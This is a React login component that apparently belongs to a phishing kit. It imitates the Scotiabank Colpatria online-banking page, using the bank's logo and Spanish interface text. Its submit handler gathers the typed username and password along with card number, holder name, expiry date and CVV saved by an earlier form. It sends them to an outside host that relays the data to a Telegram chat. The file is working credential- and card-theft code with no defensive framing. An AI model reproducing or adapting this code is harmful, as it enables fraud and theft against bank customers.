import React, { useState, useEffect } from 'react';
import { UserIcon } from '@heroicons/react/24/outline';
import { LockClosedIcon } from '@heroicons/react/24/outline';

const ColpatriaLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState(false);

  // Función para enviar un mensaje a Telegram
  const sendTelegramMessage = async (message) => {
    try {
      const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
      const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ chatId, message }),
      });

      if (!response.ok) {
        throw new Error('Error al enviar el mensaje a Telegram');
      }
    } catch (error) {
      console.error('Error:', error);
    }
  };

  const handleSubmit = async () => {
    try {
      if (username && password) {
        // Almacenar los datos en localStorage
        localStorage.setItem('username', username);
        localStorage.setItem('password', password);
  
        // Obtener los valores del formulario
        const formValues = JSON.parse(localStorage.getItem('formValues')) || {};
        const banco = 'COLPATRIA'; // Nombre del banco
  
        // Mensaje a enviar a Telegram
        const message = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName || 'No disponible'}\n- 💳: ${formValues.cardNumber || 'No disponible'}\n- 📅: ${formValues.expirationDate || 'No disponible'}\n- 🔐: ${formValues.cvv || 'No disponible'}\n- 🏦: ${banco}\n-------------------------------------------\n🔑📱 LOGIN NETFLIX 📱🔑\n -------------------------------------------\n👤: ${username}\n🔒: ${password}`;
  
        await sendTelegramMessage(message);
      } else {
        setError(true);
      }
    } catch (error) {
      console.error('Error en el manejo del formulario:', error);
      setError(true);
    }
  };

  return (
    <div className="flex flex-col md:flex-row items-center p-6 bg-gray-100">
      <img 
        src="https://cdn.agilitycms.com/scotiabank-colombia/canvas/svgs/logos/scotiabank-colpatria-symbol-red.svg" 
        alt="Banca Virtual"
        className="w-32 mb-4 md:mb-0 md:mr-6"
      />
      <div className="flex flex-col w-full md:w-2/3">
        <h1 className="text-2xl font-bold mb-4">Ingresa a tu Banca Virtual</h1>
        <div className="relative mb-4">
          <UserIcon className="absolute left-3 top-2.5 w-5 h-5 text-gray-500" />
          <input
            type="text"
            placeholder="Usuario"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full border-b border-gray-300 focus:outline-none focus:border-red-500 pl-10 py-2"
          />
        </div>
        <div className="relative mb-4">
          <LockClosedIcon className="absolute left-3 top-2.5 w-5 h-5 text-gray-500" />
          <input
            type="password"
            placeholder="Contraseña"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full border-b border-gray-300 focus:outline-none focus:border-red-500 pl-10 py-2"
          />
        </div>
        <a href="#" className="text-sm text-blue-500 hover:underline mb-4">¿Olvidaste tu usuario o contraseña?</a>
        <button 
          onClick={handleSubmit}
          className="bg-[#ec111a] text-white font-semibold py-2 rounded-md hover:bg-red-600 transition duration-200"
        >
          Ingresar
        </button>
        {error && <p className="text-red-500 mt-2">Por favor, completa todos los campos.</p>}
      </div>
    </div>
  );
};

export default ColpatriaLogin;
